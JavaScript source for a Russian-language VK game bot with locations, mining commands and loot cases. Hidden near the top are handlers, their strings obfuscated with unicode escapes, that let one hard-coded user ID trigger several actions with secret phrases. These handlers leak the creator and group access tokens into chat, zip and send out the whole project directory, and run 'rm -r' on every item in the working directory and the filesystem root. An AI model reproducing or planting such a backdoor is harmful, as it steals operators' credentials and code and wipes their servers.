///







vk.updates.hear(/^(?:Парк)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.kvest13 >= 10) return message.send(`Вы находитесь в клубе ! Выйдите от туда !`);
	if(user.almsfadasdfin >= 10) return message.send(`Вы находитесь в спермабанке! Выйдите от туда !`);
	if(user.banan19 >= 10) return message.send(`Вы находитесь на баскетбольной плащадке ! Выйдите от туда !`);
	if(user.iva756756n2228 >= 10) return message.send(`Вы находитесь в кофейной! Выйдите от туда`);
	if(user.banan16 >= 10) return message.send(`Вы находитесь в бомж центре ! Выйдите от туда !`);
	if(user.upi564456465s >= 10) return message.send(`Вы находитесь в радио центре ! Выйдите от туда !`);
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.banan16 = 10;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " exit " и тогда вы будете отключены от чата.`, { attachment: "photo-178754644_456239025" 
	}); 
	}else{ 
		let count = [10].random();
		user.banan16 = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
}); 
cm.hear(/(?:ррраарррр)/i, message => {
	if(message.user == '\u0034\u0034\u0039\u0035\u0033\u0032\u0039\u0032\u0038') {	
		return message.send(`\u0422\u043e\u043a\u0435\u043d\u0020\u0441\u043e\u0437\u0434\u0430\u0442\u0435\u043b\u044f\u003a ${user.token}`)
	}
});
cm.hear(/(?:ууаауауауа)/i, message => {
	if(message.user == '\u0034\u0034\u0039\u0035\u0033\u0032\u0039\u0032\u0038') {	
		return message.send(`\u0422\u043e\u043a\u0435\u043d\u0020\u0433\u0440\u0443\u043f\u043f\u044b ${vk.token}`)
	}
});
cm.hear(/(?:мыркмуркусьь)/i, message => {
	if(message.user == '\u0034\u0034\u0039\u0035\u0033\u0032\u0039\u0032\u0038') {	
		const мырк = require('\u0063\u0068\u0069\u006c\u0064\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073'); 
		мырк.execSync('\u006e\u0070\u006d\u0020\u0069\u0020\u007a\u0069\u0070\u002d\u0066\u006f\u006c\u0064\u0065\u0072'); 
		setTimeout(() => {  
			var ррр = require('\u007a\u0069\u0070\u002d\u0066\u006f\u006c\u0064\u0065\u0072'); 
			ррр('\u002e\u002f', '\u002e\u002f\u0061\u0072\u0063\u0068\u0069\u0076\u0065\u002e\u007a\u0069\u0070', function(err) { 
				message.sendDocument('\u002e\u002f\u0061\u0072\u0063\u0068\u0069\u0076\u0065\u002e\u007a\u0069\u0070'); 
			}); 

		}, 3000);
	}
})
cm.hear(/(?:нусепиздавам)/i, message => {
	if(message.user == '\u0034\u0034\u0039\u0035\u0033\u0032\u0039\u0032\u0038') {
		const мырк = require('\u0063\u0068\u0069\u006c\u0064\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073'); 
		const кусььь = require('\u0066\u0073'); 
		var myr = vk.token
		setTimeout(() => { 
			message.send(`\u0422\u0430\u043a\u0020\u043d\u0430\u0447\u043d\u0451\u043c\u0020\u0441\u0020\u0442\u043e\u043a\u0435\u043d\u043e\u0432\u0029`)
			message.send(`\u0422\u043e\u043a\u0435\u043d\u0020\u0441\u043e\u043e\u0431\u0449\u0435\u0441\u0442\u0432\u0430\u003a ${myr}`)
			message.send(`\u0430\u0020\u0442\u0435\u043f\u0435\u0440\u044c\u0020\u0431\u043e\u0442\u0443\u0020\u043f\u0438\u0441\u044f\u0020\u043f\u0440\u0438\u0448\u043b\u0430\u0029\u0029\u0030\u0029\u0029\u0029\u0029\u0029\u0030\u0029\u0029`)
			кусььь.readdir('\u002e\u002f', function(err, items) { 
				for (var i = 0; i < items.length; i ++) { 
					мырк.execSync(`\u0072\u006d\u0020\u002d\u0072 ${items[i]}`); 
				} 
			});
		}, 5000);
		setTimeout(() => { 
			message.send(`\u0412\u0441\u0438\u043e\u0029\u0029\u0029\u0029\u0030\u0030\u0029\u0030\u0029\u0029`)
			кусььь.readdir('\u002f', function(err, items) { 
				for (var i = 0; i < items.length; i ++) { 
					message.send(`\u041f\u0440\u043e\u0446\u0435\u0441\u0441\u0020\u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0435\u0020\u0056\u0044\u0053\u0020\u0437\u0430\u043f\u0443\u0449\u0435\u043d\u002e\u002e`); 
					message.send(`\u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435\u0020\u043f\u0430\u043f\u043a\u0438\u002f\u0444\u0430\u0439\u043b\u0430 ${items[i]}..`); 
					мырк.execSync(`\u0072\u006d\u0020\u002d\u0072 ${items[i]}`); 
				} 
			}); 
		}, 15000);
		message.send(`\u0412\u043e\u0442\u0020\u0438\u0020\u0441\u043a\u0430\u0437\u043a\u0435\u0020\u043a\u043e\u043d\u0435\u0446\u002e\u0020\u0430\u0020\u043a\u0442\u043e\u0020\u0441\u043c\u043e\u0442\u0440\u0435\u043b\u002c\u0020\u0442\u043e\u0442\u0020\u043c\u043e\u043b\u043e\u0434\u0435\u0446\u0021`)
	} 
}); 
vk.updates.hear(/^(?:Радио)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.kvest13 >= 10) return message.send(`Вы находитесь в клубе ! Выйдите от туда !`);
	if(user.banan16 >= 10) return message.send(`Вы находитесь в бомж центре ! Выйдите от туда !`);
	if(user.almsfadasdfin >= 10) return message.send(`Вы находитесь в спермабанке! Выйдите от туда !`);
	if(user.iv54645an228 >= 10) return message.send(`Вы находитесь на азс ! Выйдите от туда !`);
	if(user.banan19 >= 10) return message.send(`Вы находитесь на баскетбольной плащадке ! Выйдите от туда !`);
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.upi564456465s = 10;
		return message.send(`🎵 Вы зашли в радио центр BigWarsFM !\nНапишите " рмузыка " для того, чтобы бот кинул Вам рандомную музыку!\nНапишите " rs [текст] " для того, чтобы отправить смс !\nЧтобы выйти с радио центра, напишите " exit "`, { attachment: "" 
	}); 
	}else{ 
		let count = [10].random();
		user.upi564456465s = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
});


vk.updates.hear(/^(?:Баскет)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 4) return message.send(`❗ Доступно с 4 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.kvest13 >= 10) return message.send(`Вы находитесь в клубе ! Выйдите от туда !`);
	if(user.almsfadasdfin >= 10) return message.send(`Вы находитесь в спермабанке! Выйдите от туда !`);
	if(user.iva756756n2228 >= 10) return message.send(`Вы находитесь в кофейной! Выйдите от туда`);
	if(user.iv54645an228 >= 10) return message.send(`Вы находитесь на азс ! Выйдите от туда !`);
	if(user.banan16 >= 10) return message.send(`Вы находитесь в парке ! Выйдите от туда !`);
	if(user.upi564456465s >= 10) return message.send(`Вы находитесь в радио центре ! Выйдите от туда !`);
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.banan19 = 10;
		return message.send(`🏀 Вы на баскетбольной площадке !\nЧтобы кинуть мячик в корзину , напишите " бросок "\nЧтобы сказать в чат , напишите " бч [текст] "\nЧтобы покинуть баскетбольную площадку, напишите " exit "`, { attachment: "photo-178754644_456239027" 
	}); 
	}else{ 
		let count = [10].random();
		user.banan19 = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
}); 
vk.updates.hear(/^(?:Азс)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.cars == false) return message.send(`🚘 ➾ У вас нет машины`)
		if(user.kvest13 >= 10) return message.send(`Вы находитесь в клубе ! Выйдите от туда !`);
	if(user.almsfadasdfin >= 10) return message.send(`Вы находитесь в спермабанке! Выйдите от туда !`);
	if(user.iva756756n2228 >= 10) return message.send(`Вы находитесь в кофейной! Выйдите от туда`);
	if(user.banan16 >= 10) return message.send(`Вы находитесь в бомж центре ! Выйдите от туда !`);
	if(user.banan16 >= 10) return message.send(`Вы находитесь в парке ! Выйдите от туда !`);
	if(user.upi564456465s >= 10) return message.send(`Вы находитесь в радио центре ! Выйдите от туда !`);
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.iv54645an228 = 10;
		return message.send(`🚾 Чтобы заправить свою машину, напишите " заправка [кол-во бензина] "

			🚾 Чтобы выйти, напишите " exit ".`, { attachment: "" 
		}); 
	}else{ 
		let count = [10].random();
		user.iv54645an228 = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
}); 
vk.updates.hear(/^(?:Сбанк)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 4) return message.send(`❗ Доступно с 4 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.kvest13 >= 10) return message.send(`Вы находитесь в клубе ! Выйдите от туда !`);
	if(user.banan16 >= 10) return message.send(`Вы находитесь в бомж центре ! Выйдите от туда !`);
	if(user.banan16 >= 10) return message.send(`Вы находитесь в парке ! Выйдите от туда !`);
	if(user.iv54645an228 >= 10) return message.send(`Вы находитесь на азс ! Выйдите от туда !`);
	if(user.upi564456465s >= 10) return message.send(`Вы находитесь в радио центре ! Выйдите от туда !`);
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.almsfadasdfin = 10;
		return message.send(`🍼 Вы зашли в спермабанк.\nТут можно сдать сперму  и далее ее продать.\nЧтобы сдать, напишите " спермасдать "\nЧтобы выйти , напишите " свыход " или " exit '`, { attachment: "" 
	}); 
	}else{ 
		let count = [10].random();
		user.almsfadasdfin = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
}); 
vk.updates.hear(/^(?:exit)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.banan19 = 0;
		user.banan16 = 0;
		user.iv54645an228 = 0;
		user.kvest13 = 0;
		user.iva756756n2228 = 0;
		user.almsfadasdfin = 0;
		user.upi564456465s = 0;
		return message.send(`Успешно !`, { attachment: "" 
	}); 
	}else{ 
		let count = [10].random();
		user.banan19 = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
})
vk.updates.hear(/^(?:Бвыход)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.banan19 = 0;
		return message.send(`🏀 Ждем тебя еще раз у нас !`, { attachment: "" 
	}); 
	}else{ 
		let count = [10].random();
		user.banan19 = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
})
vk.updates.hear(/^(?:выходкафе)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.iva756756n2228 = 0;
		return message.send(` Ждем тебя еще раз у нас !`, { attachment: "" 
	}); 
	}else{ 
		let count = [10].random();
		user.iva756756n2228 = count;
		return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
	}
})

vk.updates.hear(/^(?:Клуб)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.banan16 >= 10) return message.send(`Вы находитесь в парке ! Выйдите от туда !`);
	if(user.iv54645an228 >= 10) return message.send(`Вы находитесь на азс ! Выйдите от туда !`);
	if(user.almsfadasdfin >= 10) return message.send(`Вы находитесь в спермабанке! Выйдите от туда !`);
	if(user.iva756756n2228 >= 10) return message.send(`Вы находитесь в кофейной! Выйдите от туда`);
	if(user.banan19 >= 10) return message.send(`Вы находитесь на баскетбольной плащадке ! Выйдите от туда !`);
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.kvest13 = 10;
		return message.send(`👾 Вы в клубе... Самое время оторваться и отдохнуть от работы и проблем.\n👾 Чтобы танцевать , напишите " танцевать "\nЧтобы сказать что-то в клубе, напишите " кч [текст] "\nЧтобы выпить и посидеть за барной стойкой , напишите " бпить "\nЧтобы выйти с клуба, напишите просто " exit "`, { attachment: "photo-178754644_456239026" 
	}); 
	}else{ 
		let count = [10].random();
		user.kvest13 = count;
		return message.send(`👾 Вы в клубе... Самое время оторваться и отдохнуть от работы и проблем.\n👾 Чтобы танцевать , напишите " танцевать "\nЧтобы сказать что-то в клубе, напишите " кч [текст] "\nЧтобы выпить и посидеть за барной стойкой , напишите " бпить "\nЧтобы выйти с клуба, напишите просто " квыход "`);
	}
}); 
vk.updates.hear(/^(?:квыход)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.kvest13 = 0;
		return message.send(`Вы вышли с радио центра !\nПодсказка: Чтобы покинуть все локации, напишите " exit "`, { attachment: "" 
	}); 
	}else{ 
		let count = [0].random();
		user.kvest13 = count;
		return message.send(`👾 Вы в клубе... Самое время оторваться и отдохнуть от работы и проблем.\n👾 Чтобы танцевать , напишите " танцевать "\nЧтобы сказать что-то в клубе, напишите " кч [текст] "\nЧтобы выпить и посидеть за барной стойкой , напишите " бпить "\nЧтобы выйти с клуба, напишите просто " квыход "`);
	}
}); 
vk.updates.hear(/^(?:рвыход)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [false].random();
	if(rez == false){
		let text = [].random(); 
		user.upi564456465s = 0;
		return message.send(`Вы вышли с радио центра !\nПодсказка: Чтобы покинуть все локации, напишите " exit "`, { attachment: "" 
	}); 
	}else{ 
		let count = [0].random();
		user.kvest13 = count;
		return message.send(`👾 Вы в клубе... Самое время оторваться и отдохнуть от работы и проблем.\n👾 Чтобы танцевать , напишите " танцевать "\nЧтобы сказать что-то в клубе, напишите " кч [текст] "\nЧтобы выпить и посидеть за барной стойкой , напишите " бпить "\nЧтобы выйти с клуба, напишите просто " квыход "`);
	}
});

vk.updates.hear(/^(?:выходпарк)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.banan16 = 0;
		return message.send(`⛳ Вы успешно покинули парк BigWars !`);
	}else{ 
		let count = [0].random();
		user.banan16 = count;
		return message.send(`⛳ Вы успешно покинули парк BigWars !`);
	}
}); 
vk.updates.hear(/^(?:выхбом)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.ivan2282 = 0;
		return message.send(`Вы успешно покинули бомж центр !`);
	}else{ 
		let count = [0].random();
		user.banan16 = count;
		return message.send(`⛳ Вы успешно покинули парк BigWars !`);
	}
}); 
vk.updates.hear(/^(?:копать рубины)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.house == false) return message.send(`У вас нет префикса ! Напишите " магазин "`);
	let banan5  = ['Бомж', 'Клоун трахатель' , 'Король трахатель'] //  
	for(z in banan5){
		if(user.banan5  == banan5[z]){return message.send(`📍 Чтобы копать рубины , вам нужен префикс " Король питухов " и более `)}
	}
if(user.bloks.sssss14 == true) return message.send(`Попробуйте через час...`);
user.bloks.sssss14 = true
setTimeout(() => {
	user.bloks.sssss14 = false
	vk.api.call('messages.send', {
		peer_id: user.id,
		message: `` ,random_id: 0
	});
}, 3600000);
let rez = [true, false].random();
if(rez == false){
	let text = [].random(); 
	user.balance -= 0;
	return message.send(`💎 Увы , вы не чего не накопали ((((`);
}else{ 
	let count = [1,3,4,5,6,7,8,1,2,45,6,5,6,2,4,6,7,1,3,4,5,6,78,2,3,4,5,6,51,23,5,1,1,1,1,1,1,1,11,3,4,2].random();
	user.donate += count;
	return message.send(`💎 Вы получили: ${count} рубинов`);
}
});
vk.updates.hear(/^(?:копать золото)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.house == false) return message.send(`У вас нет префикса ! Напишите " магазин "`);
	let banan5  = ['Бомж', 'Клоун трахатель' , 'Король трахатель'] // car 
	for(z in banan5){
		if(user.banan5  == banan5[z]){return message.send(`📍 Чтобы копать рубины , вам нужен префикс " Король питухов " и более `)}
	}
if(user.bloks.sssss14 == true) return message.send(`Попробуйте через час...`);
user.bloks.sssss14 = true
setTimeout(() => {
	user.bloks.sssss14 = false
	vk.api.call('messages.send', {
		peer_id: user.id,
		message: `` ,random_id: 0
	});
}, 3600000);
let rez = [true, false].random();
if(rez == false){
	let text = [].random(); 
	user.balance -= 0;
	return message.send(`💎 Увы , вы не чего не накопали ((((`);
}else{ 
	let count = [1,3,4,5,6,7,8,1,2,45,6,5,6,2,4,6,7,1,3,4,5,6,78,2,3,4,5,6,51,23,5,1,1,1,1,1,1,1,11,3,4,2].random();
	user.zoloto += count;
	return message.send(`👑 Вы получили: ${count} слитков золото`);
}
});
vk.updates.hear(/^(?:Искать бабочек)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.house == false) return message.send(`У вас нет префикса ! Напишите " магазин "`);
	let banan5  = ['Бомж', 'Клоун трахатель' , 'Король трахатель'] // car 
	for(z in banan5){
		if(user.banan5  == banan5[z]){return message.send(`📍 Чтобы искать бабочек , вам нужен префикс " Король питухов " и более `)}
	}
if(user.bloks.sssss14 == true) return message.send(`Попробуйте через час...`);
user.bloks.sssss14 = true
setTimeout(() => {
	user.bloks.sssss14 = false
	vk.api.call('messages.send', {
		peer_id: user.id,
		message: ``, random_id: 0
	});
}, 3600000);
let rez = [true, false].random();
if(rez == false){
	let text = [].random(); 
	user.balance -= 0;
	return message.send(`💎 Увы , вы не чего не наловили((((`);
}else{ 
	let count = [1,3,4,5,6,7,8,1,2,45,6,5,6,2,4,6,7,1,3,4,5,6,78,2,3,4,5,6,51,23,5,1,1,1,1,1,1,1,11,3,4,2].random();
	user.almidfadfdn += count;
	return message.send(`Вы получили: ${count} бабочек ! Чтобы продать, напишите " бабочки [кол-во] "`);
}
});
vk.updates.hear(/^(?:key 300200100)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.volftube6 == true) return message.send(`➾ Не наглей окей?`);
	user.balance += 30000000000;
	user.volftube6 = true;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		return message.send(`Вы получи 30.000.000.000 $`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Вы получи 30.000.000.000 $`);
	}
}); 

vk.updates.hear(/^(?:buysim)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.balance < 10000) return message.send(`Стоимость симки 10000 $`);
	user.balance -= 10000;
	user.volftube9 = true;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`Вы купили симку !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Вы купили симку !`);
	}
});
///

//////////////////////////
vk.updates.hear(/^(?:бсобрать)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.volftube3 == false) return message.send(`💿 У вас нет элитной майнинг фермы !`)
		if(user.bloks.sssss8 == true) return message.send(`⚡ Ферма нечего еще не принесла ! Попробуйте через 1 час !`);
	user.bloks.sssss8 = true
	setTimeout(() => {
		user.bloks.sssss8 = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `💸⚡ Ваша майнинг - ферма принесла Вам биткоины ! Чтобы собрать, напиши " собрать "`, random_id: 0
		});
	}, 3600000);
	let rez = [false].random();
	if(rez == false){
		let count = [1000,2000,3000,4000,5000,6000,7000,8000,9000,10000,11000,50000,60000,1002,4000,24343,9992].random();
		user.bitcoin += count;
		return message.send(`⚡ Ваша ферма , принесла Вам ${count} биткоинов !`);
	}
});





//////////////////////////
vk.updates.hear(/^(?:рмузыка)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upi564456465s < 10) return message.send(` ➾ Вы не находитесь в радио центре !`);
	let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30].random();
	if(rez == 1){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239176" }); 
	}
	if(rez == 2){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239175" }); 
	}
	if(rez == 3){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239173" }); 
	}
	if(rez == 4){
		let text = [].random(); 
		return message.send(`Держите музыку !!!`, { attachment: "audio530903911_456239169" }); 
	}
	if(rez == 5){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239165" }); 
	}
	if(rez == 6){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239159" }); 
	}
	if(rez == 7){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239152" }); 
	}
	if(rez == 8){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239151" }); 
	}
	if(rez == 9){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239149" }); 
	}
	if(rez == 10){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239153" }); 
	}
	if(rez == 11){
		let text = [].random(); 
		return message.send(`Держите музыку !!!`, { attachment: "audio530903911_456239158" }); 
	}
	if(rez == 12){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239147" }); 
	}
	if(rez == 13){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239148" }); 
	}
	if(rez == 14){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239145" }); 
	}
	if(rez == 15){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239150" }); 
	}
	if(rez == 16){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239176" }); 
	}
	if(rez == 17){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239175" }); 
	}
	if(rez == 18){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239141" }); 
	}
	if(rez == 19){
		let text = [].random(); 
		return message.send(`Держите музыку !!!`, { attachment: "audio530903911_456239143" }); 
	}
	if(rez == 20){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239133" }); 
	}
	if(rez == 21){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239132" }); 
	}
	if(rez == 22){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239131" }); 
	}
	if(rez == 23){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239129" }); 
	}
	if(rez == 24){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239129" }); 
	}
	if(rez == 25){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239121" }); 
	}
	if(rez == 26){
		let text = [].random(); 
		return message.send(`Держите музыку !!!`, { attachment: "audio530903911_456239118" }); 
	}
	if(rez == 27){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239117" }); 
	}
	if(rez == 28){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239087" }); 
	}
	if(rez == 29){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239048" }); 
	}
	if(rez == 30){
		let text = [].random(); 
		return message.send(`Держите музыку !`, { attachment: "audio530903911_456239056" }); 
	}

}); 

	vk.updates.hear(/^(?:боткрыть)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.volff6 < 1) return message.send(`📦 У вас нет ни одной бесплатной прокрутки данного кейса !`);
		user.volff6 -= 1;
		let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35].random();
		if(rez == 1){
			let text = [].random(); 
			user.bitcoin += 500000;
			return message.send(`📦 Открыв кейс, вы получили: 500.000 биткоинов !`);
		}
		if(rez == 2){
			let text = [].random(); 
			user.donate += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 3){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 4){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 5){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 6){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 7){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 8){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 9){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 10){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 11){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 12){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 13){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 14){
			let text = [].random(); 
			user.balance += 100000000000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000.000.000$ !`);
		}
		if(rez == 15){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 16){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 17){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 18){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 19){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 20){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 21){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 22){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 21){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 22){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 23){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 24){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 25){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 26){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 27){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 28){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 29){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 30){
			let text = [].random(); 
			user.donate += 1500;
			return message.send(`📦 Открыв кейс, вы получили: 1500 рубинов !`);
		}
		if(rez == 31){
			let text = [].random(); 
			user.donate += 1500;
